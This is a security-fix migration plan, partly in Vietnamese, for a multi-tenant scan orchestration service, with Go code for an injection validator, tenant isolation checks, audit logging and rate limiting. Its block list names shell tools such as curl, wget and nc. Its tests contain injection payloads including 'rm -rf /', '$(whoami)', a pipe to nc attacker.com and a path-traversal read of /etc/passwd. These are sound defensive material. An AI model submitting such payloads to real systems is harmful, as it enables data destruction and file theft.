# Security Fixes Migration Plan - Scan Orchestration System

**Created:** 2026-01-26
**Status:** IN PROGRESS
**Priority:** CRITICAL
**Last Updated:** 2026-01-26

---

## Executive Summary

Báo cáo đánh giá bảo mật đã phát hiện các lỗ hổng nghiêm trọng trong Scan Orchestration System. Document này mô tả chi tiết kế hoạch khắc phục theo từng phase.

---

## 1. Findings Summary

### 1.1 Critical Issues (P0)

| ID | Issue | Status | Commit |
|----|-------|--------|--------|
| SEC-001 | Command Injection via Step Config | ✅ FIXED | `dbe178b` |
| SEC-002 | Scanner Config Passthrough to Agent | ✅ FIXED | `dbe178b` |
| SEC-003 | Tool Name Injection | ✅ FIXED | `dbe178b` |

### 1.2 High Severity Issues (P1)

| ID | Issue | Status | Commit |
|----|-------|--------|--------|
| SEC-004 | Missing Tenant Isolation in GetRun | ✅ FIXED | `dbe178b` |
| SEC-005 | Missing Tenant Isolation in DeleteStep | ✅ FIXED | `dbe178b` |
| SEC-006 | Cross-Tenant Asset Group Reference | ✅ FIXED | `dbe178b` |
| SEC-007 | No Audit Logging | 🔜 TODO | - |

### 1.3 Medium Severity Issues (P2)

| ID | Issue | Status | Commit |
|----|-------|--------|--------|
| SEC-008 | No Rate Limiting on Trigger Endpoints | 🔜 TODO | - |
| SEC-009 | Cron Expression Injection | ✅ FIXED | `dbe178b` |
| SEC-010 | Capabilities Injection | ✅ FIXED | `dbe178b` |

---

## 2. Phase 1: Critical Security Fixes ✅ COMPLETED

### 2.1 SecurityValidator Service

**File:** `api/internal/app/security_validator.go`

**Features:**
- Tool name validation against tool registry
- Capability whitelist validation
- Dangerous config key detection
- Command injection pattern detection
- Cron expression validation

**Dangerous Patterns Blocked:**
```go
// Shell metacharacters
[;&|$\x60]

// Command substitution
\$\([^)]+\)    // $(...)
`[^`]+`        // backticks

// Command chaining
\|\s*\w+       // | command
;\s*\w+        // ; command
&&\s*\w+       // && command
\|\|\s*\w+     // || command

// Path traversal
\.\./

// Dangerous tools
(curl|wget|nc|bash|sh)\s+

// Suspicious paths
/bin/|/usr/bin/|/tmp/|/etc/
```

**Dangerous Config Keys Blocked:**
```go
command, cmd, exec, execute, shell, bash, sh, script,
eval, system, popen, subprocess, spawn, run_command,
os_command, raw_command, custom_command
```

### 2.2 Integration Points

**PipelineService:**
```go
// AddStep - validate before create
func (s *PipelineService) AddStep(ctx context.Context, input AddStepInput) (*pipeline.Step, error) {
    if s.securityValidator != nil {
        result := s.securityValidator.ValidateStepConfig(ctx, tenantID, input.Tool, input.Capabilities, input.Config)
        if !result.Valid {
            return nil, fmt.Errorf("%w: %s", shared.ErrValidation, result.Errors[0].Message)
        }
    }
    // ...
}

// UpdateStep - validate before update
// queueStepForExecution - final validation before agent
```

**ScanService:**
```go
// CreateScan - validate scanner config and cron
func (s *ScanService) CreateScan(ctx context.Context, input CreateScanInput) (*scan.Scan, error) {
    if s.securityValidator != nil && input.ScannerConfig != nil {
        result := s.securityValidator.ValidateScannerConfig(ctx, tenantID, input.ScannerConfig)
        // ...
    }
    if s.securityValidator != nil && input.ScheduleCron != "" {
        if err := s.securityValidator.ValidateCronExpression(input.ScheduleCron); err != nil {
            // ...
        }
    }
}
```

### 2.3 Tenant Isolation Fixes

**GetRun Handler:**
```go
func (h *PipelineHandler) GetRun(w http.ResponseWriter, r *http.Request) {
    tenantID := middleware.GetTenantID(r.Context())
    // ...
    if run.TenantID.String() != tenantID {
        h.logger.Warn("SECURITY: cross-tenant run access attempt", ...)
        apierror.NotFound("pipeline run not found").WriteJSON(w)
        return
    }
}
```

**DeleteStep Handler:**
```go
func (h *PipelineHandler) DeleteStep(w http.ResponseWriter, r *http.Request) {
    // First verify template belongs to tenant
    _, err := h.service.GetTemplate(r.Context(), tenantID, templateID)
    if err != nil {
        h.handleServiceError(w, err)
        return
    }
    // Then delete step
}
```

**CreateScan Service:**
```go
// Verify asset group belongs to tenant
ag, err := s.assetGroupRepo.GetByID(ctx, assetGroupID)
if ag.TenantID() != tenantID {
    s.logger.Warn("SECURITY: cross-tenant asset group access attempt", ...)
    return nil, fmt.Errorf("%w: asset group not found", shared.ErrNotFound)
}
```

---

## 3. Phase 2: Audit Logging 🔜 TODO

### 3.1 Requirements

**Events to Log:**

| Entity | Actions | Priority |
|--------|---------|----------|
| Pipeline Template | Create, Update, Delete, Activate, Deactivate | High |
| Pipeline Step | Create, Update, Delete | High |
| Pipeline Run | Trigger, Complete, Fail, Cancel | Critical |
| Scan | Create, Update, Delete, Trigger | High |
| Security Events | Validation failures, Cross-tenant attempts | Critical |

### 3.2 Implementation Plan

**File:** `api/internal/app/audit_events.go`

```go
// AuditEvent types for scan/pipeline operations
const (
    AuditPipelineTemplateCreated   = "pipeline_template.created"
    AuditPipelineTemplateUpdated   = "pipeline_template.updated"
    AuditPipelineTemplateDeleted   = "pipeline_template.deleted"
    AuditPipelineRunTriggered      = "pipeline_run.triggered"
    AuditPipelineRunCompleted      = "pipeline_run.completed"
    AuditPipelineRunFailed         = "pipeline_run.failed"
    AuditPipelineRunCancelled      = "pipeline_run.cancelled"
    AuditScanCreated               = "scan.created"
    AuditScanUpdated               = "scan.updated"
    AuditScanDeleted               = "scan.deleted"
    AuditScanTriggered             = "scan.triggered"
    AuditSecurityValidationFailed  = "security.validation_failed"
    AuditSecurityCrossTenantAccess = "security.cross_tenant_access"
)
```

**Integration:**
```go
// Add to PipelineService
func (s *PipelineService) CreateTemplate(ctx context.Context, input CreateTemplateInput) (*pipeline.Template, error) {
    // ... create template ...

    s.auditLogger.Log(ctx, AuditPipelineTemplateCreated, map[string]any{
        "tenant_id":   input.TenantID,
        "template_id": t.ID.String(),
        "name":        input.Name,
        "created_by":  input.CreatedBy,
    })

    return t, nil
}
```

### 3.3 Files to Modify

- [ ] `api/internal/app/pipeline_service.go` - Add audit logging
- [ ] `api/internal/app/scan_service.go` - Add audit logging
- [ ] `api/internal/app/audit_events.go` - New file with event definitions
- [ ] `api/cmd/server/services.go` - Inject audit logger

---

## 4. Phase 3: Rate Limiting 🔜 TODO

### 4.1 Requirements

| Endpoint | Limit | Window | Scope |
|----------|-------|--------|-------|
| `POST /api/v1/pipelines/{id}/runs` | 5 | 1 minute | Per tenant |
| `POST /api/v1/quick-scan` | 10 | 1 hour | Per tenant |
| `POST /api/v1/scans/{id}/trigger` | 20 | 1 hour | Per scan |
| `POST /api/v1/pipelines/templates` | 50 | 1 hour | Per tenant |

### 4.2 Implementation Options

**Option A: Middleware-based (Recommended)**
```go
// api/internal/infra/http/middleware/rate_limit.go
func RateLimit(store redis.Client, limit int, window time.Duration) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            tenantID := GetTenantID(r.Context())
            key := fmt.Sprintf("ratelimit:%s:%s", r.URL.Path, tenantID)

            count, err := store.Incr(r.Context(), key).Result()
            if err != nil {
                // Allow on error (fail open for availability)
                next.ServeHTTP(w, r)
                return
            }

            if count == 1 {
                store.Expire(r.Context(), key, window)
            }

            if count > int64(limit) {
                apierror.TooManyRequests("Rate limit exceeded").WriteJSON(w)
                return
            }

            next.ServeHTTP(w, r)
        })
    }
}
```

**Option B: Service-level check**
```go
func (s *PipelineService) TriggerPipeline(ctx context.Context, input TriggerPipelineInput) (*pipeline.Run, error) {
    // Check rate limit
    if err := s.rateLimiter.Check(ctx, "pipeline_trigger", input.TenantID, 5, time.Minute); err != nil {
        return nil, err
    }
    // ...
}
```

### 4.3 Files to Modify

- [ ] `api/internal/infra/http/middleware/rate_limit.go` - New middleware
- [ ] `api/internal/infra/http/routes/scanning.go` - Apply middleware
- [ ] `api/cmd/server/main.go` - Initialize Redis for rate limiting

---

## 5. Phase 4: Additional Hardening 📅 FUTURE

### 5.1 Transaction Boundaries

**Problem:** Multi-entity operations can fail partially.

**Solution:**
```go
func (s *PipelineService) TriggerPipeline(ctx context.Context, input TriggerPipelineInput) (*pipeline.Run, error) {
    tx, err := s.db.BeginTx(ctx, nil)
    if err != nil {
        return nil, err
    }
    defer tx.Rollback()

    // Create run
    // Create step runs
    // Create commands

    if err := tx.Commit(); err != nil {
        return nil, err
    }
    return run, nil
}
```

### 5.2 Concurrent Run Limits

**Problem:** Users can spam-trigger pipelines.

**Solution:**
```go
// Check concurrent runs before triggering
count, err := s.runRepo.CountActive(ctx, tenantID)
if err != nil {
    return nil, err
}
if count >= s.maxConcurrentRuns {
    return nil, fmt.Errorf("%w: too many concurrent runs", shared.ErrResourceExhausted)
}
```

### 5.3 Input Sanitization

**Problem:** Some values may contain special characters.

**Solution:**
- Sanitize step keys (alphanumeric + underscore only)
- Sanitize template names (no special characters)
- Sanitize tag values

---

## 6. Testing Plan

### 6.1 Security Tests

```go
// tests/security/command_injection_test.go

func TestCommandInjectionBlocked(t *testing.T) {
    testCases := []struct {
        name   string
        config map[string]any
        expect bool // true = should be blocked
    }{
        {"shell_metachar", map[string]any{"target": "example.com; rm -rf /"}, true},
        {"command_sub", map[string]any{"target": "$(whoami)"}, true},
        {"pipe", map[string]any{"target": "example.com | nc attacker.com"}, true},
        {"path_traversal", map[string]any{"file": "../../../etc/passwd"}, true},
        {"normal_config", map[string]any{"target": "example.com"}, false},
    }

    for _, tc := range testCases {
        t.Run(tc.name, func(t *testing.T) {
            result := validator.ValidateStepConfig(ctx, tenantID, "nuclei", []string{"scan"}, tc.config)
            if tc.expect {
                assert.False(t, result.Valid, "should be blocked")
            } else {
                assert.True(t, result.Valid, "should be allowed")
            }
        })
    }
}

func TestTenantIsolation(t *testing.T) {
    // Create run for tenant A
    run := createTestRun(t, tenantA)

    // Try to access from tenant B - should fail
    _, err := handler.GetRun(ctx, tenantB, run.ID)
    assert.ErrorIs(t, err, shared.ErrNotFound)
}
```

### 6.2 Load Tests

```javascript
// tests/load/pipeline_rate_limit.js (k6)
import http from 'k6/http';

export let options = {
    scenarios: {
        rate_limit_test: {
            executor: 'constant-arrival-rate',
            rate: 20, // 20 requests per second
            duration: '1m',
            preAllocatedVUs: 50,
        },
    },
};

export default function() {
    let res = http.post(`${API_URL}/api/v1/pipelines/${PIPELINE_ID}/runs`, null, {
        headers: { 'Authorization': `Bearer ${TOKEN}` },
    });

    // After limit (5/min), expect 429
    check(res, {
        'rate limited after threshold': (r) => r.status === 429 || r.status === 201,
    });
}
```

---

## 7. Deployment Checklist

### Pre-deployment

- [ ] Run all security tests
- [ ] Run load tests
- [ ] Review audit log format with compliance team
- [ ] Update API documentation
- [ ] Prepare rollback plan

### Deployment

- [ ] Deploy Phase 1 (Security Validator) ✅ DONE
- [ ] Monitor for validation errors in logs
- [ ] Deploy Phase 2 (Audit Logging)
- [ ] Verify audit events in log aggregator
- [ ] Deploy Phase 3 (Rate Limiting)
- [ ] Monitor rate limit metrics

### Post-deployment

- [ ] Verify no increase in error rates
- [ ] Check audit logs are being collected
- [ ] Verify rate limits are working
- [ ] Update security documentation

---

## 8. Commits Summary

| Commit | Description | Phase |
|--------|-------------|-------|
| `3dc23ae` | fix(db): change bootstrap tokens FK from users to admin_users | Pre-req |
| `dbe178b` | feat(security): add SecurityValidator to prevent command injection | Phase 1 |

---

## 9. Contacts

- **Security Lead:** [TBD]
- **Backend Lead:** [TBD]
- **DevOps:** [TBD]

---

## 10. References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
